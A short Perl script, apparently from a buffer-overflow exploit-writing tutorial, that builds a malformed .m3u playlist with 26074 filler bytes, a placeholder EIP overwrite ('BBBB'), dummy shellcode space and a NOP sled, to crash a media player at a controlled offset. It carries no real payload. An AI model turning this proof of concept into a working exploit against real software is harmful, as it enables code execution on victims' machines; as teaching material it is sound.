my $file= "test1.m3u";
my $junk= "A" x 26074;
my $eip = "BBBB";
my $preshellcode = "X" x 54;  #let's pretend this is the only space we have available
my $nop = "\x90" x 230;  #added some nops to visually separate our 54 X's from other data

open($FILE,">$file");
print $FILE $junk.$eip.$preshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
